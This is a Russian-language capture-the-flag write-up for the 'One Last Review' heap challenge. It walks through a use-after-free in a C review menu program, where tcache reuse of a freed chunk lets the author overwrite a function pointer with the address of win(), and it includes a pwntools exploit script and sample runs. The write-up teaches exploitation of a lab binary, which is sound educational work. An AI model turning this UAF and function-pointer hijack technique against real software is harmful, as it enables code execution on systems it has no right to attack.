# One Last Review - разбор (heap UAF, переиспользование tcache, косвенный вызов на win)

## Знакомство с задачей

В архиве два файла:

- `chall.c` - полный исходник программы на C
- `chall` - скомпилированный бинарник (ELF64, не PIE, без strip)

Программа - интерактивное консольное меню «оставь отзыв» на 6 опций:

```text
1. Submit a review
2. Mark review as favourite
3. Delete review
4. Write a draft
5. Preview favourite review
6. Leave
```

Задача: добраться до `win()`, которая открывает `flag.txt` и печатает его.

Раз исходник дан, быстрейший путь - читать его: смотреть, где объекты выделяются, где освобождаются и где происходят косвенные вызовы (указатели на функции).

## Изучение исходника (что важно)

Ключевая структура - отзыв:

```c
#define REVIEW_TEXT_SIZE 32

struct review {
    char text[REVIEW_TEXT_SIZE];   // offset 0x00, 32 байта
    void (*display)(review_t *review);  // offset 0x20, указатель на функцию
};
```

То есть в памяти отзыв занимает 40 байт: 32 байта текста + 8 байт указателя на функцию, которая его показывает.

Сразу видно: `win()` есть в коде, помечена `__attribute__((used, noinline))` (чтобы компилятор не выпилил), и она делает `fopen("flag.txt", "r")`:

```c
__attribute__((used, noinline))
void win(review_t *unused)
{
    char flag[256];
    FILE *file;

    file = fopen("flag.txt", "r");
    if (file == NULL) { puts("The prize envelope is missing..."); exit(1); }
    ...
    printf("Five stars! Here is your prize:\n%s", flag);
    exit(0);
}
```

Проблема только одна: из меню она никак не вызывается. Значит, надо перехватить косвенный вызов и перенаправить его на `win`.

## Баг: delete_review оставляет висячий указатель

Смотрю на функцию удаления:

```c
static void delete_review(void)
{
    if (review == NULL) { puts("There is no review to delete."); return; }

    free(review);
    review = NULL;
    puts("Review deleted.");
}
```

Чанк освобождается, `review` обнуляется - а глобальный указатель `favourite` тут **не трогается**. Если отзыв был помечен как избранный, `favourite` продолжает указывать на освобождённый чанк. Это классический **use-after-free**.

## Путь к использованию: write_draft переиспользует чанк

`write_draft` показывает, как воспользоваться висячим указателем:

```c
static void write_draft(void)
{
    long length;
    ...
    printf("Draft length (1-%zu): ", sizeof(draft->contents));
    length = read_number();
    if (length < 1 || (size_t)length > sizeof(draft->contents)) { ... }

    draft = malloc(sizeof(*draft));   // sizeof(draft_t) == sizeof(review_t) == 40
    ...
    memset(draft->contents, 0, sizeof(draft->contents));
    printf("Send exactly %ld draft bytes: ", length);
    read_exact(draft->contents, (size_t)length);
    ...
}
```

Черновик - это структура `draft_t`, размер которой равен размеру `review_t` (40 байт), и она целиком состоит из контролируемых нами данных (буфер `contents`). Мы сами выбираем `length` от 1 до 40, то есть можем записать **любые 40 байт**.

А функция просмотра избранного - цель:

```c
static void preview_favourite(void)
{
    if (favourite == NULL) { ... }

    favourite->display(favourite);   // косвенный вызов по указателю!
}
```

Она делает косвенный вызов `display` из структуры, на которую указывает `favourite`. Если заставить `favourite` указывать на память, где мы контролируем поле `display`, - получим произвольный вызов функции.

## План атаки

1. `submit_review` выделяет на куче чанк 40 байт, заполняет `text`, ставит `display = show_review`.
2. `mark_favourite` - `favourite = review`.
3. `delete_review` - `free(review)`, `review = NULL`. `favourite` остаётся висячим.
4. `write_draft` - `malloc(40)`. Освобождённый чанк из п.3 - того же размера, и **tcache/fastbin переиспользует именно его**. То есть `draft` теперь указывает на ту же память, на которую висит `favourite`.
5. Через `read_exact` записываем туда свои 40 байт: 32 байта мусора + `p64(addr_of_win)`.
6. `preview_favourite` - вызывает указатель `display` (который мы заменили на `win`). Победа.

Так как бинарник не PIE (тип EXEC в readelf), адрес `win` статический и никуда не «плавает». Беру его из таблицы символов:

```bash
$ nm chall | grep win
000000000040135f T win
```

## Эксплойт (scripts/solve.py)

```python
WIN = 0x40135F  # win() - статический адрес, бинарь non-PIE
...
def run_exploit(r):
    payload = b"A" * 32 + p64(WIN)  # text[32] + display = win

    r.sendlineafter(b"> ", b"1")                          # submit a review
    r.sendlineafter(b"Review: ", b"Hello")                # текст отзыва
    r.sendlineafter(b"> ", b"2")                          # mark favourite: favourite = review
    r.sendlineafter(b"> ", b"3")                          # delete review: free(review), favourite висит
    r.sendlineafter(b"> ", b"4")                          # write draft: malloc(40) переиспользует freed-чанк
    r.sendlineafter(b"Draft length (1-40): ", b"40")
    r.sendafter(b"Send exactly 40 draft bytes: ", payload)
    r.sendlineafter(b"> ", b"5")                          # preview favourite: вызывает display() = win()

    r.recvuntil(b"Five stars! Here is your prize:\n")
    return r.recvline().decode(errors="replace").strip()
```

Небольшие нюансы:

- На инстансе соединение обёрнуто в TLS (`ncat --ssl`), поэтому в pwntools обязателен `ssl=True` - без него соединение рвётся сразу.
- Длину черновика отправляем `sendlineafter` (в меню её читает `strtol` по строке), а сами 40 байт - `sendafter`: `read_exact` читает ровно 40 байт, и лишний `\n` остался бы в буфере и вызвал безобидный `Invalid choice.` перед пунктом 5.
- `payload` содержит нулевые байты (`p64(0x40135f)`), поэтому отправлять его надо байтами, а не «строкой».

## Локальная проверка

```bash
$ python3 scripts/solve.py --local
[*] local run, workdir /tmp/one_last_review_su91cyc9
FLAG: FortID{LOCAL_TEST_ONLY}
```

Скрипт сам кладёт бинарь во временный каталог и создаёт рядом `flag.txt` с тестовым флагом, поэтому `assets/` остаётся чистым. Локально всё срабатывает с первого раза.

## Запуск на инстансе

```bash
$ python3 scripts/solve.py baby-pwn-<INSTANCE>.inst14.ctf.fortid.com 1337
...
FLAG: FortID{W0ah_...}   (замаскирован)
```

## Тупики (что я рассматривал и отверг)

1. **Перезапись GOT.** Не нужна и не проще: косвенный вызов в `preview_favourite` - это прямой вызов по указателю на структуру, которую мы полностью контролируем - GOT не участвует.
2. **Переполнение стека / формат-строка.** В исходнике их нет; единственный косвенный вызов - `display` у отзыва.
3. **Сначала ликнуть libc.** Не нужно: `win` находится в самом бинаре по фиксированному адресу, а бинарь не PIE. База libc не требуется.

## Версия в один абзац

One Last Review - baby-heap: структура отзыва 40 байт с указателем на функцию `display`, которую `delete_review` освобождает, пока глобальный `favourite` всё ещё на неё указывает (UAF). `write_draft` выделяет тот же размер 40, tcache переиспользует освобождённый чанк, и мы заполняем его 32 байтами мусора + статическим адресом `win` (0x40135f, бинарь не PIE). `preview_favourite` затем вызывает поле `display`, которое теперь указывает на `win`, - и флаг напечатан.

## Уроки

1. Освобождённый объект с живым указателем-алиасом (UAF) полезен только если можно заново заполнить освобождённый чанк контролируемыми данными того же размера.
2. Указатели на функции в структурах - самая прямая цель для перехвата: подмени указатель, и любой последующий косвенный вызов через него станет произвольным исполнением кода.
3. Non-PIE бинарь делает «win» фиксированной константой - лик не нужен, просто `nm` и упакуй адрес.
4. Читай исходник ради размеров аллокаций: `draft_t` того же размера, что `review_t`, - это ровно то, что превращает «освобождённый чанк» в «переиспользованный чанк».

## Файлы

- `assets/chall.c` - исходник задачи (как выдан)
- `assets/chall` - бинарь (ELF64, не PIE, not stripped)
- `scripts/solve.py` - эксплойт: `python3 solve.py <host> [port]` или `--local`